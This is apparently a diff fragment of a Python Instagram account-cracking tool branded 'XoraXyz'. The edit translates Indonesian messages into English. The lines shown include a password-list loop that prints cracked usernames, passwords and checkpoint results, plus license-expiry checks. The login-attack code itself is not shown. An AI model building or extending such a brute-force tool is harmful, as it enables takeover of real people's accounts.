                     print(f"{K}[{P}•{K}]{P} Usernames :{K} {username}")
                     print(f"{K}[{P}•{K}]{P} Passwords :{K} {password}")
@@ -1390,7 +1390,7 @@ def Metode5(username, name, pass_list):
                 with print_lock:
                     print(" " * 100, end='\r')
                     print(f"{K}[{P}⬤{K}]{P} ToolsByme :{K} ミ★ 𝗫𝗼𝗿𝗮𝗫𝘆𝘇 ★彡")
-                    print(f"{K}[{P}●{K}]{P} Saveresin :{K} {CPE}")
+                    print(f"{K}[{P}●{K}]{P} Savers :{K} {CPE}")
                     print(f"{K}[{P}•{K}]{P} Fullnames :{K} {name}")
                     print(f"{K}[{P}•{K}]{P} Usernames :{K} {username}")
                     print(f"{K}[{P}•{K}]{P} Passwords :{K} {password}")
@@ -1405,9 +1405,9 @@ def Metode5(username, name, pass_list):
         except requests.exceptions.ConnectionError:
             time.sleep(31)
         except Exception as e:
-            #print(f"[ERROR] Exception terjadi!")
-            #print(f"[ERROR] Tipe error: {type(e).__name__}")
-            #print(f"[ERROR] Pesan: {str(e)}")
+            #print(f"[ERROR] Exception occurred!")
+            #print(f"[ERROR] Error type: {type(e).__name__}")
+            #print(f"[ERROR] Message: {str(e)}")
             continue
     Loop += 1
 
@@ -1415,9 +1415,9 @@ def kadaluarsaa():
     banner()
     Kadaluarsa = "06-05-2026" 
     if datetime.datetime.now() > datetime.datetime.strptime(Kadaluarsa, "%d-%m-%Y"):
-        cetak(panel(f'[bold white]Maaf [bold green]KODE LISENSI [bold white]Anda Sudah [bold red]Tidak Aktif [bold white]Atau [bold red]Kadaluarsa', width=58, style="bold white"))
+        cetak(panel(f'[bold white]Sorry [bold green]LICENSE CODE [bold white]You Are [bold red]Inactive [bold white]Or [bold red]Expired', width=58, style="bold white"))
         sys.exit()
-    cetak(panel(f'[bold white]Good [bold green]KODE LISENSI [bold white]Anda [bold green]Sudah Aktif [bold white]Tunggu Sebentar!!!!', width=58, style="bold white"))
+    cetak(panel(f'[bold white]Good [bold green]LICENSE CODE [bold white]You [bold green]Active [bold white]Please Wait!!!!', width=58, style="bold white"))
     time.sleep(6)
     Menu()
 
@@ -1429,26 +1429,26 @@ def lisensi():
         now = datetime.datetime.now()
         exp_date = datetime.datetime.strptime(Kadaluarsa1, "%d-%m-%Y")
         if now > exp_date:
-            print("Maaf KODE LISENSI Anda Sudah Tidak Aktif Atau Kadaluarsa")
+            print("Sorry LICENSE CODE You Are Inactive Or Expired")
             sys.exit()
     except:
-        print("Maaf KODE LISENSI Anda Sudah Tidak Aktif Atau Kadaluarsa")
+        print("Sorry LICENSE CODE You Are Inactive Or Expired")
         sys.exit()
     base_dir = os.path.expanduser("~/.config/.instagram")
     file_lisensi = os.path.join(base_dir, ".key")
     if not os.path.exists(file_lisensi):
-        print("Maaf KODE LISENSI Anda Sudah Tidak Aktif Atau Kadaluarsa")
+        print("Sorry LICENSE CODE You Are Inactive Or Expired")
         sys.exit()
     try:
         with open(file_lisensi, "r") as f:
             stored_key = f.read().strip()
         if stored_key != KodeLisensi:
-            print("Maaf KODE LISENSI Anda Sudah Tidak Aktif Atau Kadaluarsa")
+            print("Sorry LICENSE CODE You Are Inactive Or Expired")
             sys.exit()
     except:
-        print("Maaf KODE LISENSI Anda Sudah Tidak Aktif Atau Kadaluarsa")
+        print("Sorry LICENSE CODE You Are Inactive Or Expired")
         sys.exit()
-    print("Good KODE LISENSI Anda Sudah Aktif Tunggu Sebentar")
+    print("Good LICENSE CODE You Are Active, Please Wait")
     time.sleep(3)
     Menu()
 
